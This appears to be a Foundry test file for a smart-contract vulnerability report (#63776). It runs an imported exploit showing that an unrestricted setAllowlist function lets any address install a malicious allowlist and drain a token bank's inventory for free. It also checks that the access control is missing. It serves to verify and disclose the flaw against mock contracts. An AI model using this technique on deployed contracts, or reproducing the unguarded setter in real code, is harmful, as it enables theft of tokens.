// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./63776-signaturevalidatorsetallowlist-is-unrestricted-leading-to-fr.sol";

/*//////////////////////////////////////////////////////////////
    Remora — unrestricted setAllowlist → free buyTokenOCP (#63776)

    - test_exploit: drives the cheatcode-free Exploit end to end.
    - test_setAllowlist_isCallableByAnyone: control that the access
      check is absent (any address can call setAllowlist).
//////////////////////////////////////////////////////////////*/
contract SetAllowlistUnrestrictedTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        MockCentralToken central = e.central();
        address investor = e.INVESTOR();
        uint256 total = e.TOTAL_TOKENS();

        assertEq(central.balanceOf(investor), total, "investor got free tokens");
        assertEq(central.balanceOf(address(e.bank())), 0, "bank inventory drained");
    }

    function test_setAllowlist_isCallableByAnyone() public {
        MockCentralToken central = new MockCentralToken();
        TokenBank bank = new TokenBank(central);
        address rando = makeAddr("rando");
        MaliciousAllowlist mal = new MaliciousAllowlist(rando);

        // No prank-as-admin needed — any EOA can set the allowlist.
        vm.prank(rando);
        bank.setAllowlist(address(mal));
        assertEq(bank.allowlist(), address(mal), "allowlist replaced by rando");
    }
}
